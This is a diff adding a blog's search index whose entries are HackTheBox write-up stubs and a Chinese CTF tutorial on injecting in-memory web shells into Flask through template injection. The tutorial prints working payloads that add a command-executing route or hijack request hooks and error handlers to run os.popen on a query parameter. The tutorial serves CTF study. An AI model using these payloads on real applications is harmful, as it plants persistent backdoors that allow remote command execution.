@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>HTB-Linkvortex</title>
+      <link href="/2026/02/14/HTB-Linkvortex/"/>
+      <url>/2026/02/14/HTB-Linkvortex/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> HackTheBox </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTB-Pterodactyl</title>
+      <link href="/2026/02/14/HTB-Pterodactyl/"/>
+      <url>/2026/02/14/HTB-Pterodactyl/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h1 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE-"></a>CVE-</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> HackTheBox </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTB-Facts</title>
+      <link href="/2026/02/02/HTB-Facts/"/>
+      <url>/2026/02/02/HTB-Facts/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/Facts]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.129.35.87 -oA nmapscans/ports</span><br><span class="line">Nmap scan report <span class="keyword">for</span> facts.htb (10.129.35.87)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">54321/tcp open  unknown</span><br></pre></td></tr></table></figure><p>开放了22、80、54321端口</p><h1 id="Camaleon-CMS"><a href="#Camaleon-CMS" class="headerlink" title="Camaleon CMS"></a>Camaleon CMS</h1><h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h1 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> HackTheBox </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Flask无回显RCE</title>
+      <link href="/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
+      <url>/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
+      
+        <content type="html"><![CDATA[<h2 id="debug模式"><a href="#debug模式" class="headerlink" title="debug模式"></a>debug模式</h2><p>如果程序开启了debug模式，那么一般是要计算pin值，计算出pin值就很简单了。</p><h2 id="非debug模式"><a href="#非debug模式" class="headerlink" title="非debug模式"></a>非debug模式</h2><h3 id="0x01-旧版内存马"><a href="#0x01-旧版内存马" class="headerlink" title="0x01 旧版内存马"></a>0x01 旧版内存马</h3><p>低版本的flask(ssti)一般可以直接使用以下payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure><p><strong>原理</strong>:</p><p>第一行利用url_for函数作为入口点获取了当前命名空间的__builtins__模块，然后调用eval函数。<br>这个eval传入了两个参数，看第二个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">    &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要介绍一下eval的第二个参数：<br>eval的第二个参数允许传入一个字典，一般是用来指定表达式执行的<strong>全局变量命名空间（globals）</strong><br>接下来再去理解第二个参数中传入的值就很好了。<br><code>_request_ctx_stack</code>是一个请求上下文栈。请求上下文是指在处理HTTP请求的过程中，Flask创建的一个临时环境，用来存储和管理与当前请求相关的信息<br><code>url_for.__globals__[&#39;current_app&#39;]</code>是当前运行的app。<br>然后看一下执行的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;app.add_url_rule(</span><br><span class="line">        &#x27;/shell&#x27;, </span><br><span class="line">        &#x27;shell&#x27;, </span><br><span class="line">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span><br></pre></td></tr></table></figure><p>app.add_url_rule()是一个可以用来动态的添加路由的方法，我们可以通过这个方法动态的添加一个路由，其中我们可以通过匿名函数来处理这个路由的请求。<br>为了获取我们注入的命令，我们还需要当前HTTP请求的request对象，这也就是我们一开始要获取<code>_request_ctx_stack</code>的原因。在这个栈里，栈顶元素_request_ctx_stack.top自然就是我们当前请求的上下文，其中包含request对象，于是我们就可以获取当前请求GET传参的值，进而执行我们传入的命令。</p><h3 id="0x02-新版内存马"><a href="#0x02-新版内存马" class="headerlink" title="0x02 新版内存马"></a>0x02 新版内存马</h3><p>比较新的flask版本，不允许我们在运行app的时候调用它的add_url_rule函数。<br>在阅读了大佬们写的文章后，我得知了可以使用flask自带的钩子函数，来达到注入内存马的目的。</p><p><strong>before_request</strong></p><p>before_request()是Flask下的一个解释器，服务端在处理请求之前会调用before_request所设置的回调函数对请求进行预处理，比如说，身份验证、权限检查等。<br>我们可以通过调用app.before_request_funcs.setdefault()函数来为我们的before_request设置处理函数，在SSTI的过程中我们需要获取到eval函数或者exec函数来插入内存马。<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure><p>跟旧版的一样，我们需要先获取上下文。<br>因此在eval执行命令的时候我们可以使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()),&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;</span><br></pre></td></tr></table></figure><p>但是原内容会被before_request的返回内容覆盖，我们可以使用after_request解决这个问题。</p><p><strong>after_request</strong></p><p>先看以下函数介绍：<br><img src="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png" alt="Pasted image 20250417093253"><br>这个解释器要求我们接收一个response对象，并且返回一个response对象。因此我们在定义匿名函数的时候需要设置一个参数(默认为respose类型)<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()) if request.args.get(&#x27;cmd&#x27;) else resp)</span><br></pre></td></tr></table></figure><p>SSTI中用法跟before_request一样。</p><p><strong>teardown_request</strong></p><p>跟after_request用法一模一样，但是没有回显。</p><p><strong>errorhandler</strong></p><p>errorhandler装饰器允许我们自定义报错界面<br>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def error():</span><br><span class="line">return &quot;404!!!&quot;</span><br></pre></td></tr></table></figure><p>通过errorhandler绑定一个钩子函数，然后HTTP状态码为404时就调用我们自定义的函数，那么我们就可以加以利用。<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure><p>要用exec执行命令，eval不支持执行多条python命令。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究 - gxngxngxn - 博客园</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WEB </tag>
+            
+            <tag> Flask </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
